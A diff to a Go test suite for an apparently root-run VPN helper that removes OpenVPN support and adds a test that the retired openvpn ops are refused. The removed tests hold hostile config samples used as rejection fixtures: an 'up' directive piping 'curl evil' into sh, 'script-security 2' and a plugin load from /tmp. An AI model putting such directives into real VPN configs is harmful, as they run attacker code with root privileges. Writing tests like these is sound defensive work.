@@ -37,16 +37,6 @@ func newRec(t *testing.T) *rec {
 			switch filepath.Base(argv[0]) {
 			case "wg-quick":
 				link("sntl0")
-			case "openvpn":
-				for i := 0; i+1 < len(argv); i++ {
-					switch argv[i] {
-					case "--writepid":
-						_ = os.WriteFile(argv[i+1], []byte("4242\n"), 0o644)
-					case "--log":
-						_ = os.WriteFile(argv[i+1], []byte("Initialization Sequence Completed\n"), 0o644)
-					}
-				}
-				link("sntl-ovpn")
 			}
 			return nil, nil, nil
 		},
@@ -69,11 +59,6 @@ func newRec(t *testing.T) *rec {
 	}
 	for _, d := range []string{"sys/class/net", "usr/sbin", "etc"} {
 		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
-			t.Fatal(err)
-		}
-	}
-	for _, b := range []string{"usr/sbin/openvpn"} {
-		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
 			t.Fatal(err)
 		}
 	}
@@ -111,9 +96,8 @@ func mustJSON(v any) string {
 }
 
 var (
-	cleanWG   = read("../guard/testdata/corpus/wireguard/minimal.conf")
-	cleanAWG  = read("../guard/testdata/corpus/amneziawg/minimal.conf")
-	cleanOVPN = read("../guard/testdata/corpus/openvpn/minimal.conf")
+	cleanWG  = read("../guard/testdata/corpus/wireguard/minimal.conf")
+	cleanAWG = read("../guard/testdata/corpus/amneziawg/minimal.conf")
 )
 
 func read(p string) string {
@@ -245,7 +229,7 @@ func TestStatusReadsTheInterfaceTable(t *testing.T) {
 	r := newRec(t)
 	_ = os.WriteFile(filepath.Join(r.root, "sys/class/net/sntl0"), nil, 0o644)
 	res := call(t, r, "status", "")
-	if !res.OK || string(res.Encode()) != `{"id":1,"ok":true,"result":{"wgUp":true,"tunUp":false,"ovpnUp":false}}` {
+	if !res.OK || string(res.Encode()) != `{"id":1,"ok":true,"result":{"wgUp":true,"tunUp":false}}` {
 		t.Fatalf("got %s", res.Encode())
 	}
 }
@@ -269,6 +253,21 @@ func TestUnknownOpIsRejected(t *testing.T) {
 	res := call(t, r, "frobnicate", "")
 	if res.OK || res.Error != "unknown op: frobnicate" || len(r.cmds) != 0 {
 		t.Fatalf("got %+v", res)
+	}
+}
+
+// OpenVPN was removed in 1.19.0: its ops are unknown now, so nothing reaches an
+// openvpn binary as root, and an older app is refused before payment by the op list.
+func TestRemovedOpenVpnOpsAreUnknown(t *testing.T) {
+	r := newRec(t)
+	for _, op := range []string{"openvpn_up", "openvpn_down"} {
+		res := call(t, r, op, `{"configString":"client\n"}`)
+		if res.OK || res.Error != "unknown op: "+op {
+			t.Fatalf("%s: got %+v", op, res)
+		}
+	}
+	if len(r.cmds) != 0 {
+		t.Fatalf("nothing may run, ran %v", r.lines())
 	}
 }
 
@@ -306,60 +305,6 @@ func TestAmneziawgUpRejectsPostUp(t *testing.T) {
 func TestAmneziawgDown(t *testing.T) {
 	r := newRec(t)
 	if res := call(t, r, "amneziawg_down", ""); !res.OK || !r.has("ip link delete sntl0") {
-		t.Fatalf("got %+v %v", res, r.lines())
-	}
-}
-
-func TestOpenvpnUpPassesOnlyTheRootOwnedPathAndOurFlags(t *testing.T) {
-	r := newRec(t)
-	res := call(t, r, "openvpn_up", cfgArgs(cleanOVPN))
-	if !res.OK {
-		t.Fatalf("rejected: %s", res.Error)
-	}
-	conf := filepath.Join(r.root, ops.RunDir, "openvpn.conf")
-	want := filepath.Join(r.root, "usr/sbin/openvpn") + " --config " + conf +
-		" --dev sntl-ovpn --dev-type tun --script-security 0 --connect-timeout 10 --connect-retry-max 2 --verb 3 --log " +
-		filepath.Join(r.root, ops.RunDir, "openvpn.log") + " --writepid " + filepath.Join(r.root, ops.RunDir, "openvpn.pid") + " --daemon katacomb-ovpn"
-	if !r.has(want) {
-		t.Fatalf("want %s\n got %v", want, r.lines())
-	}
-}
-
-func TestOpenvpnUpRejectsScriptDirectives(t *testing.T) {
-	r := newRec(t)
-	for _, evil := range []string{
-		strings.Replace(cleanOVPN, "nobind", `up /bin/sh -c "curl evil | sh"`, 1),
-		strings.Replace(cleanOVPN, "nobind", "script-security 2", 1),
-		strings.Replace(cleanOVPN, "nobind", "plugin /tmp/evil.so", 1),
-	} {
-		if res := call(t, r, "openvpn_up", cfgArgs(evil)); res.OK {
-			t.Fatal("accepted a script directive")
-		}
-	}
-	if len(r.cmds) != 0 {
-		t.Fatal("nothing may run")
-	}
-}
-
-func TestOpenvpnUpFailsClosedWhenNotInstalled(t *testing.T) {
-	r := newRec(t)
-	_ = os.Remove(filepath.Join(r.root, "usr/sbin/openvpn"))
-	res := call(t, r, "openvpn_up", cfgArgs(cleanOVPN))
-	if res.OK || res.Error != "openvpn is not installed" || len(r.cmds) != 0 {
-		t.Fatalf("got %+v %v", res, r.cmds)
-	}
-}
-
-func TestOpenvpnUpRequiresConfigString(t *testing.T) {
-	r := newRec(t)
-	if res := call(t, r, "openvpn_up", `{"configPath":"/tmp/evil.conf"}`); res.OK || res.Error != "openvpn_up: configString required" {
-		t.Fatalf("got %+v", res)
-	}
-}
-
-func TestOpenvpnDown(t *testing.T) {
-	r := newRec(t)
-	if res := call(t, r, "openvpn_down", ""); !res.OK || !r.has("ip link delete sntl-ovpn") {
 		t.Fatalf("got %+v %v", res, r.lines())
 	}
 }
